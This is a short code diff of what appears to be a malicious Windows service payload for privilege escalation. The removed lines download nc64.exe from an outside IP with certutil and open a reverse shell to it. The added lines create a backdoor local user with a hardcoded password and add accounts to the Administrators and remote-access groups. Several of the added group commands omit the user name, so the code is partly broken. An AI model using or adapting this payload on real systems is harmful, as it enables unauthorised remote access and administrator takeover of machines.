@@ -27,15 +27,17 @@ void ControlHandler(DWORD request);
 
 /*
  * Optional Payloads:
- * 	- cmd.exe /k net localgroup administrators user /add
+ * 	- cmd.exe /k net localgroup administrators added_user /add
  * 	- whoami > c:\\windows\\temp\\service.txt
  * */
 
 //add the payload here
 int Run() 						// make sure the files are being served at the correct addresses
 { 
-    system("certutil -urlcache -f http://10.2.5.182:8082/nc64.exe C:\\Temp\\nc64.exe");
-    system("C:\\Temp\\nc64.exe -e cmd.exe 10.2.5.182 4445");		// This is the line that executes the malicious command(s)
+	system("net user /add added_user Password1#");
+	system("net localgroup administrators /add");
+	system("net localgroup \"Remote Desktop Users\" /add");
+	system("net localgroup \"Remote Management Users\" /add");
     return 0; 
 } 
 
